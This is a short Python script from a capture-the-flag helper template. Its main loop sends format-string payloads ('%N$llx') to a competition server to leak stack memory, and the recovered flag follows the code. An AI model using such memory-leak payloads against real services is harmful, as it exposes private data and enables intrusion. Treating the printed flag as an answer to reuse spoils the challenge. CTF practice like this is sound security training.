#!/usr/bin/python
# Helper CTF script by Gynvael Coldwind
# IMPORTANT: Just use pwntools, seriously.
import random
import sys
import socket
import telnetlib
import os
import time
import threading
from struct import pack, unpack
from time import time

def recvuntil(sock, txt):
  d = ""
  while d.find(txt) == -1:
    try:
      dnow = sock.recv(1)
      if len(dnow) == 0:
        return ("DISCONNECTED", d)
    except socket.timeout:
      return ("TIMEOUT", d)
    except socket.error as msg:
      return ("ERROR", d)
    d += dnow
  return ("OK", d)

def recvall(sock, n):
  d = ""
  while len(d) != n:
    try:
      dnow = sock.recv(n - len(d))
      if len(dnow) == 0:
        return ("DISCONNECTED", d)
    except socket.timeout:
      return ("TIMEOUT", d)
    except socket.error as msg:
      return ("ERROR", d)
    d += dnow
  return ("OK", d)

# Proxy object for sockets.
class gsocket(object):
  def __init__(self, *p):
    self._sock = socket.socket(*p)

  def __getattr__(self, name):
    return getattr(self._sock, name)

  def recvall(self, n):
    err, ret = recvall(self._sock, n)
    if err != "OK":
      return False
    return ret

  def recvuntil(self, txt):
    err, ret = recvuntil(self._sock, txt)
    if err != "OK":
      return False
    return ret

# Base for any of my ROPs.
def db(v):
  return pack("<B", v)

def dw(v):
  return pack("<H", v)

def dd(v):
  return pack("<I", v)

def dq(v):
  return pack("<Q", v)

def rb(v):
  return unpack("<B", v[0])[0]

def rw(v):
  return unpack("<H", v[:2])[0]

def rd(v):
  return unpack("<I", v[:4])[0]

def rq(v):
  return unpack("<Q", v[:8])[0]

def go():
  global HOST
  global PORT
  s = gsocket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((HOST, PORT))

  i = 1
  while True:
      s.sendall('3\n%' + str(i) + '$llx\n')
      s.recvuntil('\n< ')
      k = s.recvuntil(' >\n').split(' ')[0]
      b = dq(int(k, 16))
      hexprint([ord(x) for x in b])
      i += 1


  # Put your code here!

  # Interactive sockets.
  #t = telnetlib.Telnet()
  #t.sock = s
  #t.interact()

  # Python console.
  # Note: you might need to modify ReceiverClass if you want
  #       to parse incoming packets.
  #ReceiverClass(s).start()
  #dct = locals()
  #for k in globals().keys():
  #  if k not in dct:
  #    dct[k] = globals()[k]
  #code.InteractiveConsole(dct).interact()

  s.close()

HOST = 'pwn-textbook.2021.ctfcompetition.com'
PORT = 1337
go()

CTF{format_string_for_the_win}
